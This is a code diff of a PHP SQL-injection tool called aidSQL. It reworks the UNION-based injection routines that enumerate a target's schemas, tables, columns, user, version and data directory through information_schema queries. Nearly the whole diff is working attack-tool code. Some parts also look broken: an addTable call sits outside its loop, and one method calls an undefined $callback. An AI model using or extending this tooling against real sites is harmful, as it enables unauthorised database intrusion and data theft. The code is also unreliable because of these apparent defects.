@@ -250,9 +250,9 @@
 			}
 
 
-			private function detectTruncatedData($string=NULL,$length){
+			private function detectTruncatedData($string=NULL){
 
-				if(strlen($string) == $length){
+				if(strlen($string) == $this->_groupConcatLength){
 
 					$this->log("Warning! Detected possibly truncated data!",2,"yellow");
 					return TRUE;
@@ -312,19 +312,47 @@
 			}
 
 
-			public function getSchemas($complete=TRUE){
+			public function getSchemas(){
+
+				if($this->_config["all"]["wanted-schemas"]=="none"){
+					return FALSE;
+				}
 
 				$groupConcatLength	=	$this->getGroupConcatLength();
-				$version					=	$this->getVersion();
-				$version					=	$version[0];
-				$databases				=	$this->unionQuery("GROUP_CONCAT(DISTINCT(TABLE_SCHEMA))","information_schema.tables",array());
+
+				$from						=	array();
+				$injection				=	"DISTINCT(TABLE_SCHEMA)";
+
+				switch($this->_config["all"]["wanted-schemas"]){
+
+					case "{all}":
+						$from			=	"information_schema.tables";
+						break;
+
+					case "{current}":
+						$injection	=	"DATABASE()";
+						break;
+
+					default:
+
+						$from			=	"information_schema.tables";
+						$where		=	array("TABLE_SCHEMA","IN(",$this->_config["all"]["wanted-schemas"].')');
+						break;
+
+				}
+
+				//Here we use group concat in order to see if the injection can be achieved 
+				//with little or no effort
+
+				$databases				=	$this->unionQuery("GROUP_CONCAT($injection)",$from,array());
 				$databases				=	$databases[0];
-				$user						=	$this->getUser();
-				$user						=	$user[0];
 
-				if($this->detectTruncatedData($databases,$groupConcatLength)){
+				//However if we detect that the data we fetched is truncated, we are forced 
+				//to perform a few 10ths or 100ths of more queries :(
 
-					$databases	=	$this->unionQueryIterateLimit("DISTINCT(TABLE_SCHEMA)","information_schema.tables");
+				if($this->detectTruncatedData($databases)){
+
+					$databases	=	$this->unionQueryIterateLimit($injection,$from);
 
 				}else{
 
@@ -332,47 +360,96 @@
 
 				}
 
+				$version					=	$this->getVersion();
+				$version					=	$version[0];
+				$user						=	$this->getUser();
+				$user						=	$user[0];
+
+				if(isset($this->_config["all"]["ommit-schemas"]) && !empty($this->_config["all"]["ommit-schemas"])){
+
+					$ommitSchemas	=	explode(',',$this->_config["all"]["ommit-schemas"]);
+
+				}
+
 				foreach($databases as $database){
-
-					if ($database	==	"information_schema"){
-						$this->log("Skipping fetching information_schema databse",0,"yellow");
-						continue;
-					}
-
-					$dbSchema	=	new \aidSQL\core\DatabaseSchema();
-
-					$dbSchema->setDbName($database);
-					$dbSchema->setDbVersion($version);
-					$dbSchema->setDbUser($user);
 
 					$this->log("FOUND DATABASE $database",0,"light_purple");
 
-					$tables	=	$this->unionQuery("GROUP_CONCAT(TABLE_NAME)","information_schema.tables",array("table_schema=".\String::hexEncode($database)));
-					$tables	=	$tables[0];
-				
-					if($this->detectTruncatedData($tables,$groupConcatLength)){
+					if(isset($ommitSchemas)){
 
-						$tables	=	$this->unionQueryIterateLimit("TABLE_NAME","information_schema.tables",array("table_schema=".\String::hexEncode($database)));
-
-					}else{
-
-						$tables	=	explode(',',$tables);
+						if(in_array($database,$ommitSchemas)){
+							$this->log("Skipping fetching \"$database\" schema",0,"yellow");
+							continue;
+						}
 
 					}
 
-					foreach($tables as $table){
+					$dbSchema	=	$this->getSingleSchema($database);
 
-						$dbSchema->addTable($table,array());
+					$dbSchema->setDbUser($user);
+					$dbSchema->setDbVersion($version);
+
+					if($this->_config["all"]["schema"] == "complete"){
+
+						$tables	=	$dbSchema->getTables();
+
+						if(sizeof($tables)){
+
+							foreach($tables as $table){
+
+								$columns	=	$this->getColumns($table,$database);
+
+							}
+
+							$dbSchema->addTable($table,$columns);
+
+						}
 
 					}
 
-					$this->addSchema($dbSchema);	
+					$this->addSchema($dbSchema);
 
 				}
 
 			}
 
-			public function getColumns($table=NULL){
+			public function getSingleSchema($database){
+
+				$groupConcatLength	=	$this->getGroupConcatLength();
+
+				$dbSchema				=	new \aidSQL\core\DatabaseSchema();
+
+				$dbSchema->setDbName($database);
+	
+				$select	=	"TABLE_NAME";
+				$from		=	"information_schema.tables";
+				$where	=	array("table_schema=".\String::hexEncode($database));
+
+				$tables	=	$this->unionQuery("GROUP_CONCAT($select)",$from,$where);
+				$tables	=	$tables[0];
+			
+				if($this->detectTruncatedData($tables)){
+
+					$tables	=	$this->unionQueryIterateLimit($select,$from,$where);
+
+				}else{
+
+					$tables	=	explode(',',$tables);
+
+				}
+
+				foreach($tables as $table){
+
+					$dbSchema->addTable($table,array());
+
+				}
+
+				return $dbSchema;
+
+			}
+			
+
+			public function getColumns($table=NULL,$database=NULL){
 
 				if(is_null($table)){
 
@@ -381,49 +458,43 @@
 
 				}
 
+				if(is_null($database)){
+
+					throw(new \Exception("ERROR: Database name cannot be empty when trying to fetch columns! (Please report bug)"));
+					return array();
+
+				}
+
 				$this->log("Fetching table \"$table\" columns ...",0,"white");
 
-				$select							=	"GROUP_CONCAT(COLUMN_NAME)";
-				$from								=	"FROM information_schema.columns WHERE table_schema=DATABASE() ".
-														"AND table_name=".\String::hexEncode($table);
+				$select							=	"COLUMN_NAME";
+				$from								=	"information_schema.columns";
+				$where							=	array(
+																	"table_schema=".\String::hexEncode($database),
+																	"AND",
+																	"table_name=".\String::hexEncode($table)
+														);
 
-				$restoreTerminatingPayload	=	$this->_currTerminatingPayload;
-				$this->_currTerminatingPayload	=	"ORDER BY 1 DESC";
+				$columns =	$this->unionQuery("GROUP_CONCAT($select)",$from,$where);	
+				$columns	=	$columns[0];
 
-				$tableFields	=	$this->execute($select,$from);
+				if($this->detectTruncatedData($columns)){
 
-				if($this->detectTruncatedData($tableFields)){
-
-					$limit			=	1;
-					$select			=	"COLUMN_NAME";
-					$from				=	"FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name=$table";
-
-					$tableFields					=	array();
-
-					while($field	=	$this->execute($select,$from)){
-
-						$this->_currTerminatingPayload	=	"ORDER BY 1 LIMIT ".$limit.",1";
-						$limit++;
-						$tableFields[]	=	$field;
-
-					}
-
+					$columns = $this->unionQueryIterateLimit($select,$from,$where);
 
 				}else{
 
-					$tableFields	=	explode(',',$tableFields);
+					$columns = explode(',',$columns);
 
-					if(!is_array($tableFields)){
+					if(!is_array($columns)){
 
-						$tableFields	=	array();
+						$columns	=	array();
 
 					}
 					
 				}
 
-				$this->_currTerminatingPayload	=	$restoreTerminatingPayload;
-
-				return $tableFields;
+				return $columns;
 
 			}
 
@@ -444,14 +515,7 @@
 			public function getDatadir(){
 
 				$select	= "@@datadir";
-				return $this->execute($select);
-
-			}
-
-			public function toFile(File $file){
-
-				$select = "INTO OUT_FILE ";
-				return $this->execute($select);
+				return $this->$callback($select);
 
 			}
 
@@ -525,7 +589,6 @@
 				$information			=	$webDefaultsPlugin->getInfo();
 
 				if (!is_a($information,"\\aidSQL\\plugin\\info\\InfoResult")){
-
 					throw(new \Exception("Plugin $plugin[name] should return an instance of \\aidSQL\\plugin\\info\\InfoResult"));
 				}
 
